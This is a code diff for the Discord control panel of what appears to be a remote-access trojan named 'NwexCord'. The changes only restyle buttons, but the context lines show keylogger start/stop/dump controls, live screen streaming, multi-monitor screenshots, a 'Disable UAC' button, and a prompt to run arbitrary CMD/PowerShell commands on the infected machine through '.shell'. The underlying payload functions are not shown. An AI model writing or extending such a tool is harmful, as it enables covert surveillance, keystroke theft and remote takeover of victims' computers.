@@ -95,7 +95,7 @@ class LiveStreamView(discord.ui.View):
         btn = discord.ui.Button(label="Open Stream in Browser", url=url, style=discord.ButtonStyle.link, emoji="🌐")
         self.add_item(btn)
 
-    @discord.ui.button(label="Stop Stream", emoji="⏹", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="Stop Stream", emoji="⏹", style=discord.ButtonStyle.secondary)
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         SystemManager.stop_stream = LiveStreamManager.stop_stream
         success, msg = LiveStreamManager.stop_stream()
@@ -121,12 +121,12 @@ class ScreenShotSelectView(discord.ui.View):
         
         # Add a button for each monitor
         for i, bbox in enumerate(monitors):
-            btn = discord.ui.Button(label=f"Monitor {i+1}", style=discord.ButtonStyle.primary)
+            btn = discord.ui.Button(label=f"Monitor {i+1}", style=discord.ButtonStyle.secondary)
             btn.callback = self.make_callback(bbox, str(i+1))
             self.add_item(btn)
             
         # Add capture all button
-        all_btn = discord.ui.Button(label="All Monitors", style=discord.ButtonStyle.success)
+        all_btn = discord.ui.Button(label="All Monitors", style=discord.ButtonStyle.secondary)
         all_btn.callback = self.make_callback(None, "All")
         self.add_item(all_btn)
 
@@ -216,7 +216,7 @@ class SystemPanelView(discord.ui.View):
             embed.set_footer(text="NwexCord • System")
             await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
 
-    @discord.ui.button(label="Live Screen", emoji="📺", style=discord.ButtonStyle.success, row=0)
+    @discord.ui.button(label="Live Screen", emoji="📺", style=discord.ButtonStyle.secondary, row=0)
     async def livescreen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if LiveStreamManager._is_running and LiveStreamManager._public_url:
             embed = discord.Embed(title="📺 Live Screen Active", description="The stream is already running.", color=discord.Color.green())
@@ -248,7 +248,7 @@ class SystemPanelView(discord.ui.View):
     async def listener_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(ListenerDurationModal())
 
-    @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.danger, row=1)
+    @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.secondary, row=1)
     async def uac_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         loop = asyncio.get_event_loop()
@@ -322,7 +322,7 @@ class SystemPanelView(discord.ui.View):
         embed.add_field(name="\u200b", value=right_col, inline=True)
         embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
         msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
-        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())
+        await interaction.edit_original_response(content=msg_content, embed=embed, view=_get_startup_view()())
 
 
 class KeyLoggerView(discord.ui.View):
@@ -330,7 +330,7 @@ class KeyLoggerView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=300)
 
-    @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.success, row=0)
+    @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.secondary, row=0)
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         success, msg = SystemManager.start_keylogger()
@@ -339,7 +339,7 @@ class KeyLoggerView(discord.ui.View):
         embed.set_footer(text="NwexCord • System")
         await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
 
-    @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.danger, row=0)
+    @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.secondary, row=0)
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         success, msg, logged = SystemManager.stop_keylogger()
@@ -360,7 +360,7 @@ class KeyLoggerView(discord.ui.View):
         embed.set_footer(text="NwexCord • System")
         await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
 
-    @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.primary, row=0)
+    @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.secondary, row=0)
     async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         logged = SystemManager.get_keylogger_dump()
